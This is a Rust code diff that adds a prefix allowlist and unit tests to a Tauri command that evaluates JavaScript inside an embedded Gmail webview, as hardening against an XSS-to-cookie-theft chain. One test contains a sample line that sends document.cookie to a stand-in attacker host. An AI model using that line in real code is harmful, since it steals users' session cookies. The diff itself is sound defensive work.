@@ -202,24 +202,98 @@ pub async fn browse_reload(app: AppHandle) -> Result<(), String> {
     Ok(())
 }
 
-/// F6 (Layer 3 · reliability sprint) — evaluate arbitrary JavaScript inside
-/// the persistent browse-panel webview. Fire-and-forget: `wv.eval` on Tauri
-/// v2 does not return the JS return value. Callers that need a result MUST
-/// wrap the script so it emits a Tauri event (or calls `window.__TAURI_IPC`)
-/// with the payload. The F6 Gmail-compose driver uses this pattern to poll
-/// for compose-ready + send-confirmation + captcha states.
+/// 2026-07-04 hardening · allowlist of the Gmail-driver JS template
+/// prefixes the frontend is allowed to eval inside the browse panel.
+/// Every entry corresponds to a Layer-2/3 primitive (F5 contact-list
+/// probe, F6 compose driver, ML-4 click-to-include injector). Scripts
+/// that do not start with one of these prefixes are rejected so an
+/// XSS bug in the react app can't wrap `webview_eval` into an
+/// arbitrary-JS-in-Gmail cookie-exfil chain.
+const ALLOWED_EVAL_PREFIXES: &[&str] = &[
+    // ML-4 · click-to-include injector (runs once per Gmail load).
+    "window.__lcClickToIncludeInstalled",
+    // F6 · Gmail compose driver — open compose button.
+    "document.querySelector('[gh=\"cm\"]')",
+    // F6 · compose-ready poll.
+    "document.querySelector('[role=\"dialog\"]')",
+    // F6 · send-confirmation poll.
+    "document.querySelector('[data-tooltip=\"Send\"]')",
+    // F5 · contact-list probe (Gmail Contacts / Chat rosters).
+    "document.querySelectorAll('[role=\"listitem\"]')",
+    // gmailComposeBridge · higher-level driver entrypoint (Phase 5).
+    "window.__lcGmailComposeDriver",
+];
+
+/// Returns true when `script` starts with one of the allowlisted
+/// template prefixes. `trim_start` tolerates leading whitespace /
+/// newlines from template-literal composition.
+fn is_eval_allowlisted(script: &str) -> bool {
+    let head = script.trim_start();
+    ALLOWED_EVAL_PREFIXES.iter().any(|p| head.starts_with(p))
+}
+
+/// F6 (Layer 3 · reliability sprint) — evaluate JavaScript inside the
+/// persistent browse-panel webview, gated by the ``ALLOWED_EVAL_PREFIXES``
+/// allowlist so only known-safe Gmail-driver templates run. Fire-and-forget:
+/// `wv.eval` on Tauri v2 does not return the JS return value. Callers that
+/// need a result MUST wrap the script so it emits a Tauri event (or calls
+/// `window.__TAURI_IPC`) with the payload. The F6 Gmail-compose driver uses
+/// this pattern to poll for compose-ready + send-confirmation + captcha
+/// states.
 ///
 /// Errors:
 ///   - "browse panel not open"          · caller must open_browse_panel first
+///   - "script not in allowlist"        · script prefix isn't in
+///                                       ALLOWED_EVAL_PREFIXES (hardening
+///                                       block against XSS→cookie-exfil)
 ///   - "webview eval failed: <detail>"  · the WebView refused the script
 ///                                       (rare — usually the caller passed
 ///                                       malformed JS or the webview died)
 #[tauri::command]
 pub async fn webview_eval(app: AppHandle, script: String) -> Result<(), String> {
+    if !is_eval_allowlisted(&script) {
+        eprintln!(
+            "[SECURITY] webview_eval rejected non-template script (len={})",
+            script.len()
+        );
+        return Err("script not in allowlist".into());
+    }
     let wv = app
         .get_webview(PANEL_LABEL)
         .ok_or_else(|| "browse panel not open".to_string())?;
     wv.eval(&script)
         .map_err(|e| format!("webview eval failed: {e}"))?;
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::is_eval_allowlisted;
+
+    #[test]
+    fn allowlisted_prefixes_match() {
+        for p in super::ALLOWED_EVAL_PREFIXES {
+            assert!(
+                is_eval_allowlisted(&format!("{}\n// driver body", p)),
+                "prefix {p} should be allowlisted",
+            );
+        }
+    }
+
+    #[test]
+    fn arbitrary_script_rejected() {
+        // The canonical XSS→cookie-exfil chain.
+        let arbitrary = "fetch('https://evil.com/steal?c=' + document.cookie)";
+        assert!(!is_eval_allowlisted(arbitrary));
+    }
+
+    #[test]
+    fn leading_whitespace_tolerated() {
+        assert!(is_eval_allowlisted("   \n\twindow.__lcClickToIncludeInstalled = true"));
+    }
+
+    #[test]
+    fn empty_string_rejected() {
+        assert!(!is_eval_allowlisted(""));
+    }
 }
